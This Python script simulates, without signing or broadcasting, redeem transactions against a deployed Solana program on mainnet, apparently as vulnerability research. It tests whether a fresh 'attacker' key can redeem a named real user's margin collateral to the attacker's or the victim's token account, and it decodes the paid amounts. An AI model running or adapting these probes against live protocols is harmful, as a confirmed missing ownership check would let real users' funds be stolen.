#!/usr/bin/env python3
"""Simulate redeem for margins with remaining collateral to learn the paid amount + ownership gates.
Builds correct account metas (state writable), decodes RedeemUsdcLog from logs.
"""
import json, urllib.request, time, base64, hashlib, struct
from solders.transaction import Transaction
from solders.message import Message
from solders.pubkey import Pubkey
from solders.instruction import Instruction, AccountMeta
from solders.hash import Hash

RPC = "https://api.mainnet-beta.solana.com"
def rpc(method, params, retries=5, timeout=120):
    body = json.dumps({"jsonrpc":"2.0","id":1,"method":method,"params":params}).encode()
    last=None
    for i in range(retries):
        try:
            req = urllib.request.Request(RPC, data=body, headers={"Content-Type":"application/json","User-Agent":"research/1.0"})
            with urllib.request.urlopen(req, timeout=timeout) as r:
                out = json.loads(r.read())
            if "error" in out: raise RuntimeError(out["error"])
            return out
        except Exception as e:
            last=e; time.sleep(1.5*(i+1))
    raise RuntimeError(str(last))

ALPH='123456789ABCDEFGHJKLMNPQRSTUVWXYZabcdefghijkmnopqrstuvwxyz'
def b58e(b):
    n=int.from_bytes(b,'big'); s=''
    while n: n,rem=divmod(n,58); s=ALPH[rem]+s
    for by in b:
        if by==0: s='1'+s
        else: break
    return s or '1'

ZO = Pubkey.from_string("Zo1ggzTUKMY5bYnDvT5mtVeZxzf2FaLTbKkmvGUhUQk")
TOKEN = Pubkey.from_string("TokenkegQfeZyiNwAJbNbGKPFXCWuBvf9Ss623VQ5DA")
ATA_PROG = Pubkey.from_string("ATokenGPvbdGVxr1b2hvZbsiqW5xWH25efTNsLJA8knL")
STATE = Pubkey.from_string("71yykwxq1zQqy99PgRsgZJXi2HHK2UDx9G4va7pH6qRv")
VAULT = Pubkey.from_string("HjHSNe8hhvZ8hKCRrhKg1DGiGPd9NYQbUjT1SQRDo4kZ")
A2 = Pubkey.from_string("6kSuaA8Fi16ks53ye8eqgr7jZn2uus59W7gMSasgtFon")
A8 = Pubkey.from_string("Dwi4TnaYJTMUkVaHQgfKq6QzuWsyFSJwMxzkTemTLrvt")
VAULT_ATA = Pubkey.from_string("3er2PEWxhpuRkbVwE3ks2nynr5EtcSjCs5fdDJiKQocp")
USDC = Pubkey.from_string("EPjFWdd5AufqSSqeM2qN1xzybapC8G4wEGGkZwyTDt1v")
REDEEM_DATA = bytes.fromhex("658ef6b8c6385cae")

def find_pda(seeds, program_id):
    pid = bytes(program_id)
    for bump in range(255, -1, -1):
        h = hashlib.sha256(pid + b''.join(seeds) + bytes([bump]) + pid + b"ProgramDerivedAddress").digest()
        # off-curve check
        p=0x7fffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffed
        d=(p-121665)*pow(121666,p-2,p)%p
        y=int.from_bytes(h,'little') & ((1<<255)-1)
        ok=False
        if y<p:
            y2=y*y%p; u=(y2-1)%p; v=(d*y2+1)%p
            x2=u*pow(v,p-2,p)%p
            ok=(x2==0) or (pow(x2,(p-1)//2,p)==1)
        if not ok: return Pubkey.from_bytes(h), bump
    return None,None

def ata(authority, mint=USDC):
    return find_pda([bytes(authority), bytes(TOKEN), bytes(mint)], ATA_PROG)[0]

def redeem_ix(signer, margin, control, dest):
    metas = [
        AccountMeta(STATE, True, False),     # writable (per real tx)
        AccountMeta(VAULT, False, False),
        AccountMeta(A2, True, False),
        AccountMeta(signer, True, True),
        AccountMeta(margin, True, False),
        AccountMeta(control, True, False),
        AccountMeta(dest, True, False),
        AccountMeta(VAULT_ATA, True, False),
        AccountMeta(A8, False, False),
        AccountMeta(TOKEN, False, False),
    ]
    return Instruction(ZO, REDEEM_DATA, metas)

def sim(ixs, payer, label):
    msg = Message.new_with_blockhash(ixs, payer, Hash.default())
    tx = Transaction.new_unsigned(msg)
    b64 = base64.b64encode(bytes(tx)).decode()
    r = rpc("simulateTransaction",[b64,{"encoding":"base64","sigVerify":False,"replaceRecentBlockhash":True,"commitment":"processed"}])
    v=r["result"]["value"]
    logs=v.get("logs") or []
    events=[]
    for l in logs:
        if "Program data:" in l:
            raw=base64.b64decode(l.split("Program data: ")[1].strip())
            events.append(raw.hex())
    amt=None; disc=None
    for e in events:
        if e.startswith("437a2f4a0f060e20") and len(e)==160:
            amt=int.from_bytes(bytes.fromhex(e[-16:]),"little")
            disc="RedeemUsdcLog"
    print(f"\n### {label}")
    print("  err:", json.dumps(v.get("err")))
    print("  RedeemUsdcLog amount:", amt, "raw micro-USD" if amt is not None else "")
    print("  events:", events)
    for l in logs:
        if "AnchorError" in l or "Instruction:" in l or "failed" in l.lower() or "Result" in l:
            print("   log:", l[:200])
    return {"label":label,"err":v.get("err"),"amount":amt,"events":events,"logs":logs}

# 1) The 99000-collateral margin user
M99000 = Pubkey.from_string("12Vgds9vkUgW9QjeMCtnx71HzVfDmwj48bjpcE3RW8AN")
AUTH99000 = Pubkey.from_string("2F26j5jYb9pUWywfn9MMHEaznqmQgNMGFKoh5WA6XUTV")
# fetch full margin to get control key
mv=rpc("getAccountInfo",[str(M99000),{"encoding":"base64"}])["result"]["value"]
raw=base64.b64decode(mv["data"][0])
ctrl=Pubkey.from_bytes(raw[441:473])
print("margin 99000: nonce",raw[8],"authority",b58e(raw[9:41]),"control",str(ctrl))
print("collateral raw:", [raw[41+i*16:41+i*16+16].hex() for i in range(6)])
res=[]
res.append(sim([redeem_ix(AUTH99000, M99000, ctrl, ata(AUTH99000))], AUTH99000, "R1: 99000-margin user redeems own margin"))

# 2) Impersonation: fresh key + that margin
ATT = Pubkey.new_unique()
res.append(sim([redeem_ix(ATT, M99000, ctrl, ata(ATT))], ATT, "R2: fresh attacker signer + 99000-margin (dest=attacker ATA)"))
res.append(sim([redeem_ix(ATT, M99000, ctrl, ata(AUTH99000))], ATT, "R3: fresh attacker signer + 99000-margin (dest=victim ATA)"))
# 3) victim signer + different victim margin
res.append(sim([redeem_ix(AUTH99000, Pubkey.from_string("5UjdurrpbP3i2hkw3Q2twfcz1X7VPpQWtruNwuxRvGX8"),
                          Pubkey.from_string("4np53fZWjiHrJqddLssaA2mzA13ryc5GFZFmn1UBsQNV"), ata(AUTH99000))], AUTH99000,
               "R4: victim signer + 531euoNt margin (cross-user)"))

json.dump(res, open("analysis/sim_redeem2.json","w"), indent=1, default=str)
print("\nDONE")
